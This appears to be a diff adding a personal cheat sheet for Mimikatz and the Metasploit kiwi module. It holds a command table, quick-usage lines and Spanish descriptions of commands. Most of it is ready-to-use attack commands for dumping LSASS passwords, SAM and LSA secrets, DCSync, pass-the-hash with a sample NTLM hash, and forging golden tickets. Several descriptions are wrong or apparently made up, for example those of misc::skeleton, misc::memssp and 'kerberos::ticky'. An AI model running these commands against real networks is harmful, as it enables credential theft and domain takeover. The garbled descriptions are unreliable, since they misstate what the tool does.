@@ -1,0 +1,275 @@
+kiwi Commands                                                                                                                                                          
+=============                                                                                                                                                          
+                                                                                                                                                                       
+    Command       Description                                                                                                                                          
+    -------       -----------                                                                                                                                          
+    creds_all     Retrieve all credentials (parsed)                                                                                                                    
+    creds_kerberos  Retrieve Kerberos creds (parsed)                                                                                                                     
+    creds_livessp  Retrieve Live SSP creds                                                                                                                                                                                                                                                                                               
+    creds_msv     Retrieve LM/NTLM creds (parsed)                                                                                                                      
+    creds_ssp     Retrieve SSP creds                                                                                                                                   
+    creds_tspkg   Retrieve TsPkg creds (parsed)                                                                                                                        
+    creds_wdigest  Retrieve WDigest creds (parsed)                                                                                                                                                                                                                                                                                      
+    dcsync        Retrieve user account information via DCSync (unparsed)                                                                                              
+    dcsync_ntlm   Retrieve user account NTLM hash, SID and RID via DCSync                                                                                              
+    golden_ticket_create  Create a golden kerberos ticket                                                                                                                      
+    kerberos_ticket_list  List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use  Use a kerberos ticket
+    kiwi_cmd      Execute an arbitrary mimikatz command (unparsed)
+    lsa_dump_sam  Dump LSA SAM (unparsed)
+    lsa_dump_secrets  Dump LSA secrets (unparsed)
+    password_change  Change the password/hash of a user
+    wifi_list     List wifi profiles/creds for the current user
+    wifi_list_shared  List shared wifi profiles/creds (requires SYSTEM)
+    
+
+Quick usage
+log
+privilege::debug
+sekurlsa
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+kerberos
+kerberos::list /export
+kerberos::ptt c:\chocolate.kirbi
+
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+crypto
+crypto::capi
+crypto::cng
+
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+
+crypto::keys /export
+crypto::keys /machine /export
+vault & lsadump
+vault::cred
+vault::list
+
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+
+lsadump::dcsync /user:domain\krbtgt /domain:lab.local
+
+lsadump::dcsync /user:corp\administrador, extraigo la informacion de el usuario administrador
+
+privilege::debug: Intenta obtener los privilegios de DEBUG en el proceso actual. Esto puede ser útil para eludir ciertas restricciones de seguridad.
+
+token::elevate: Intenta elevar los privilegios del token actual al máximo nivel posible. Esto se usa para aumentar los privilegios del usuario actual, lo que puede ser útil para realizar acciones que requieran permisos elevados.
+
+sekurlsa::logonpasswords: Extrae los nombres de usuario y contraseñas almacenados en memoria a través del subsistema de seguridad de Windows (LSASS). Esta es una de las funciones más conocidas de Mimikatz y es utilizada para recuperar contraseñas almacenadas en sistemas Windows.
+
+sekurlsa::tickets /export: Extrae los tickets de autenticación (TGTs y TGSs) de LSASS. Estos tickets pueden ser utilizados para realizar ataques de Pass-the-Ticket, donde un atacante puede usar un ticket de autenticación previamente obtenido para acceder a recursos protegidos sin necesidad de conocer las credenciales del usuario.
+
+sekurlsa::pth /user:username /domain:domainname /ntlm:ntlmhash: Genera un token de acceso a partir de un hash NTLM, lo que permite a un atacante autenticarse en un sistema remoto utilizando las credenciales del usuario especificado, sin necesidad de conocer la contraseña real.
+
+lsadump::sam: Muestra la base de datos SAM (Security Accounts Manager), que contiene las cuentas de usuario locales y sus hashes de contraseñas en el sistema Windows.
+
+lsadump::lsa: Muestra los secretos locales almacenados en el sistema, como credenciales guardadas, claves de cifrado, etc.
+
+lsadump::dcsync /user:username: Como se mencionó en la pregunta anterior, este comando permite obtener información de autenticación de un usuario específico simulando ser un controlador de dominio, sin necesidad de autenticarse como ese usuario.
+
+lsadump::dcsync /domain:domainname: Similar al comando lsadump::dcsync /user:username, pero en lugar de obtener información de autenticación de un usuario específico, este comando extrae información de autenticación de todos los usuarios del dominio especificado.
+
+lsadump::trust /patch: Permite parchear la confianza entre dominios en la memoria, lo que puede ser útil para manipular la confianza entre dominios y realizar ataques de escalada de privilegios.
+
+lsadump::lsa /inject: Inyecta un secreto en el LSA (Local Security Authority) del sistema. Esto puede ser utilizado para manipular los secretos locales del sistema, como credenciales guardadas.
+
+misc::memssp: Activa o desactiva la política de Seguridad del Proveedor de Servicios de Memoria (Memory Security Support Provider). Esta política de seguridad es responsable de proteger la memoria del proceso LSASS y puede ser deshabilitada para facilitar ataques de extracción de credenciales.
+
+kerberos::list /export: Muestra los tickets Kerberos almacenados en la memoria del sistema. Estos tickets pueden ser utilizados para autenticarse en servicios protegidos por Kerberos sin necesidad de conocer las credenciales reales del usuario.
+
+crypto::capi: Muestra información sobre las claves y certificados almacenados en el almacén de claves del sistema.
+
+crypto::certificates /export: Exporta los certificados del almacén de certificados del sistema.
+
+crypto::dsa: Muestra información sobre claves y parámetros DSA (Algoritmo de Firma Digital).
+
+crypto::ecdsa: Muestra información sobre claves y parámetros ECDSA (Algoritmo de Firma Digital de Curva Elíptica).
+
+crypto::dh: Muestra información sobre claves y parámetros DH (Intercambio de Clave de Difusión).
+
+crypto::genkeys /type: Permite generar claves criptográficas de diferentes tipos, como RSA, DSA, ECDSA, etc.
+
+crypto::liststores: Lista los almacenes de claves disponibles en el sistema.
+
+crypto::import /type: Importa claves criptográficas en el almacén de claves del sistema.
+
+mimikatz_command: Ejecuta un comando arbitrario en el sistema operativo utilizando el mismo contexto de seguridad que Mimikatz. Esto puede ser útil para realizar operaciones adicionales en el sistema durante una sesión de Mimikatz.
+
+kerberos::ptt /ticket: Añade un ticket Kerberos a la caché de tickets del sistema. Esto puede ser útil para realizar ataques de Pass-the-Ticket, donde un ticket de autenticación previamente obtenido se utiliza para acceder a recursos protegidos sin necesidad de conocer las credenciales del usuario.
+
+misc::cmd: Ejecuta un comando de shell en el contexto actual de Mimikatz. Esto puede ser útil para realizar tareas adicionales en el sistema durante una sesión de Mimikatz.
+
+process::list: Muestra una lista de todos los procesos en ejecución en el sistema, incluidos los PID (identificadores de proceso) y los nombres de los procesos.
+
+process::suspend /id: Suspende la ejecución de un proceso específico en el sistema, identificado por su PID.
+
+process::resume /id: Reanuda la ejecución de un proceso que ha sido suspendido previamente.
+
+process::search /name: Busca procesos en ejecución cuyos nombres coincidan con el término especificado.
+
+process::dump /id: Realiza un volcado de memoria de un proceso específico en el sistema, identificado por su PID.
+
+process::protect /id: Protege un proceso específico en el sistema contra la inyección de código.
+
+process::unprotect /id: Elimina la protección de un proceso que ha sido protegido previamente contra la inyección de código.
+
+module: Permite enumerar, cargar y descargar módulos en el espacio de memoria del proceso actual.
+
+module::dump /addon: Realiza un volcado de memoria de un módulo específico cargado en el proceso actual.
+
+misc::memssp /disable: Deshabilita la protección del Proveedor de Servicios de Seguridad de Memoria (MemSSP), lo que puede ser útil para realizar ataques que requieren acceso a la memoria del sistema.
+
+misc::memssp /enable: Habilita la protección del Proveedor de Servicios de Seguridad de Memoria (MemSSP), restaurando la configuración predeterminada de seguridad.
+
+misc::skeleton: Este comando muestra una representación de la estructura del objeto "skeleton" de Mimikatz, lo que puede ser útil para comprender la arquitectura interna de la herramienta.
+
+kerberos::golden: Permite generar un ticket Kerberos "golden ticket", que es un ticket de autenticación Kerberos válido para cualquier servicio en un dominio, independientemente de la autenticación real del usuario.
+
+kerberos::silver: Similar al comando kerberos::golden, pero genera un ticket Kerberos "silver ticket", que es un ticket de autenticación Kerberos válido para un servicio específico en un dominio.
+
+kerberos::ticky: Este comando muestra información sobre los tickets Kerberos almacenados actualmente en la memoria del sistema.
+
+kerberos::purge: Permite eliminar todos los tickets Kerberos almacenados en la memoria del sistema, lo que puede ser útil para limpiar la memoria después de realizar actividades de auditoría o pruebas.
+
+kerberos::ptc /export: Exporta todos los tickets Kerberos almacenados en la memoria del sistema en un formato que puede ser utilizado para realizar ataques de Pass-the-Cache (PTC), donde se reutilizan los tickets Kerberos previamente obtenidos para obtener acceso a recursos protegidos.
+
+kerberos::tgt /export: Exporta todos los tickets de concesión de tickets (TGTs) almacenados en la memoria del sistema en un formato que puede ser utilizado para realizar ataques de Pass-the-Ticket (PTT).
+
+kerberos::spn: Muestra información sobre los nombres de servicio principal (SPN) registrados en el directorio activo del dominio.
+
+kerberos::list /export: Muestra todos los tickets Kerberos almacenados en la memoria del sistema y los exporta en un formato que puede ser utilizado para análisis adicional.
+
+misc::wifi: Muestra información sobre perfiles de redes Wi-Fi almacenados en el sistema, incluidos SSID, autenticación, cifrado, etc.
+
+misc::mui: Muestra información sobre los archivos de interfaz de usuario multilingüe (MUI) cargados en el sistema, incluidos los idiomas disponibles y las ubicaciones de los archivos.
+
+misc::search: Busca cadenas específicas en la memoria del sistema y muestra las direcciones de memoria donde se encontraron.
+
+misc::scl: Muestra información sobre los objetos Service Control Manager (SCM) en el sistema, incluidos los servicios instalados y sus configuraciones.
+
+misc::tasklist: Muestra una lista de las tareas en ejecución en el sistema, incluidos los identificadores de proceso (PID), los nombres de las tareas y el estado.
+
+misc::time: Muestra la fecha y la hora actuales del sistema.
+
+misc::clr: Limpia la pantalla de la consola de Mimikatz.
+
+kerberos::ask: Solicita un ticket Kerberos TGT (Ticket Granting Ticket) utilizando las credenciales proporcionadas por el usuario.
+
+kerberos::list /exportAll: Muestra todos los tickets Kerberos almacenados en la memoria del sistema y los exporta en un formato que puede ser utilizado para análisis adicional, incluyendo información sobre los usuarios que los han adquirido.
+
+kerberos::ptc /ticket: Añade un ticket Kerberos a la caché de tickets del sistema. Esto puede ser útil para realizar ataques de Pass-the-Cache (PTC).
+
+kerberos::ptt /ticket: Añade un ticket Kerberos a la caché de tickets del sistema. Esto puede ser útil para realizar ataques de Pass-the-Ticket (PTT).
+
+kerberos::tgs: Solicita un ticket Kerberos TGS (Ticket Granting Service) utilizando las credenciales proporcionadas por el usuario.
+
+kerberos::tgt /ticket: Añade un ticket Kerberos TGT (Ticket Granting Ticket) a la caché de tickets del sistema. Esto puede ser útil para realizar ataques de Pass-the-Ticket (PTT).
+
+kerberos::golden /sid: Genera un ticket Kerberos "golden ticket" para un SID (identificador de seguridad) específico.
+
+kerberos::sid: Muestra el SID (identificador de seguridad) del usuario actual.
+
+crypto::dh /in: Calcula el intercambio de claves Diffie-Hellman (DH) utilizando un archivo de entrada específico.
+
+crypto::certificates /systemstore: Muestra los certificados en el almacén de certificados del sistema.
+
+crypto::certificates /userstore: Muestra los certificados en el almacén de certificados del usuario actual.
+
+crypto::certificates /export /systemstore: Exporta los certificados del almacén de certificados del sistema.
+
+crypto::certificates /export /userstore: Exporta los certificados del almacén de certificados del usuario actual.
+
+crypto::keys /machine: Muestra las claves criptográficas en el almacén de claves del sistema.
+
+crypto::keys /user: Muestra las claves criptográficas en el almacén de claves del usuario actual.
+
+crypto::keys /export /machine: Exporta las claves criptográficas del almacén de claves del sistema.
+
+crypto::keys /export /user: Exporta las claves criptográficas del almacén de claves del usuario actual.
+
+lsadump::cache: Muestra las credenciales almacenadas en la memoria caché de credenciales del sistema.
+
+lsadump::cache /export: Exporta las credenciales almacenadas en la memoria caché de credenciales del sistema.
+
+lsadump::sam /patch: Parchea el registro SAM (Security Account Manager) en la memoria, lo que puede ser útil para realizar ataques de escalada de privilegios.
+
+lsadump::trust /export: Exporta la información de confianza entre dominios del sistema.
+
+lsadump::secrets /export: Exporta los secretos del sistema, como credenciales guardadas.
+
+misc::memssp /export: Exporta la configuración del Proveedor de Servicios de Seguridad de Memoria (MemSSP) del sistema.
+
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+sekurlsa::pth /user:username /domain:domainname /ntlm:ntlmhash
+lsadump::sam
+lsadump::lsa
+lsadump::dcsync /user:username
+lsadump::dcsync /domain:domainname
+lsadump::trust /patch
+lsadump::lsa /inject
+misc::memssp
+misc::memssp /disable
+misc::memssp /enable
+crypto::capi
+crypto::certificates /export
+crypto::dsa
+crypto::ecdsa
+crypto::dh
+crypto::genkeys /type:
+crypto::liststores
+crypto::import /type:
+mimikatz_command
+kerberos::list /export
+kerberos::golden
+kerberos::silver
+kerberos::ticky
+kerberos::purge
+kerberos::ptt /ticket:
+misc::cmd
+process::list
+process::suspend /id:
+process::resume /id:
+process::search /name:
+process::dump /id:
+process::protect /id:
+process::unprotect /id:
+module
+module::dump /addon:
+misc::mui
+misc::search
+misc::skeleton
+misc::wifi
+misc::tasklist
+misc::time
+misc::clr
+kerberos::ask
+kerberos::ptc /export
+kerberos::tgt /export
+kerberos::spn
+kerberos::list
+kerberos::ptt /export
+kerberos::tgs
+kerberos::tgt /ticket:
+kerberos::golden /sid:
+kerberos::sid
+crypto::dh /in:
+lsadump::cache
+lsadump::cache /export
+lsadump::sam /patch
+lsadump::trust /export
+lsadump::secrets /export
+misc::memssp /export
